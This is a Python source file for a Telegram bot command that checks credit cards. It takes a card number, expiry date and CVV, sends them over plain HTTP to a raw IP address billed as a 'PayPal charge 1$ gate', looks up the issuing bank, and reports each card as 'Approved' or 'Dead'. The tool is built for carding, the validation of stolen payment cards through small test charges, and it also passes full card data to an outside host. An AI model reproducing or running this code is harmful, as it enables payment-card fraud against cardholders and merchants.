import requests
from telebot.types import Message
from telebot import TeleBot
import time
from datetime import datetime

def register_pp(bot: TeleBot):
    @bot.message_handler(commands=['pp'])
    def pp_command(message: Message):
        try:
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                bot.reply_to(message, "Usage: /pp 5218101032273529|02|2026|817")
                return

            cc_data = args[1].strip()
            bin_number = cc_data[:6]
            start_time = time.time()

            # Processing animation
            processing_msg = bot.reply_to(message, "<i>Processing...</i>", parse_mode="HTML")
            emojis = ["🔄", "⏳", "💳"]
            for i in range(1, 4):
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id,
                    text=f"<i>Processing{' ' + '.' * i} {emojis[i-1]}</i>",
                    parse_mode="HTML"
                )
                time.sleep(0.8)

            # API Request
            url = f"http://194.164.150.141:5555/key=never/cc={cc_data}"
            response = requests.get(url)

            # BIN Info
            bin_info_url = f"https://lookup.binlist.net/{bin_number}"
            bin_info_response = requests.get(bin_info_url)

            if response.status_code == 200 and bin_info_response.status_code == 200:
                data = response.json()

                if "error" in data:
                    raise ValueError(data["error"])

                status = data.get("status", "Unknown")
                status_emoji = "✅" if status.lower() == "approved" else "❌"
                status_message = "Approved" if status.lower() == "approved" else "Dead"
                response_detail = data.get("response", "No response")

                bin_data = bin_info_response.json()
                bank = bin_data.get("bank", {}).get("name", "Unknown Bank")
                country = bin_data.get("country", {}).get("name", "Unknown Country")
                card_type = bin_data.get("type", "Unknown Type")

                elapsed_time = round(time.time() - start_time, 2)
                checked_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                user_id = message.from_user.id
                full_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
                user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"

                formatted_msg = (
                    "<b><i>💎 PAYPAL CHARGE 1$ GATE 💎</i></b>\n"
                    f"<b>💳:</b> <code>{cc_data}</code>\n"
                    f"<b>✅ Status:</b> <i>{status_message} {status_emoji}</i>\n"
                    f"<b>💬:</b> <i>{response_detail}</i>\n"
                    f"<b>🏦:</b> <i>{bank}</i>\n"
                    f"<b>💳 Type:</b> <i>{card_type}</i> | <b>🌍:</b> <i>{country}</i>\n"
                    f"<b>⏱:</b> <i>{elapsed_time}s</i> | <b>🕒:</b> <i>{checked_at}</i>\n"
                    f"<b>🔑 Checked by:</b> {user_link}"
                )

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id,
                    text=formatted_msg,
                    parse_mode="HTML"
                )

            else:
                error_info = response.text if response.status_code == 200 else f"HTTP {response.status_code}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id,
                    text=f"<b>API Error:</b>\n<code>{error_info}</code>",
                    parse_mode="HTML"
                )

        except Exception as e:
            bot.reply_to(message, f"<b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")
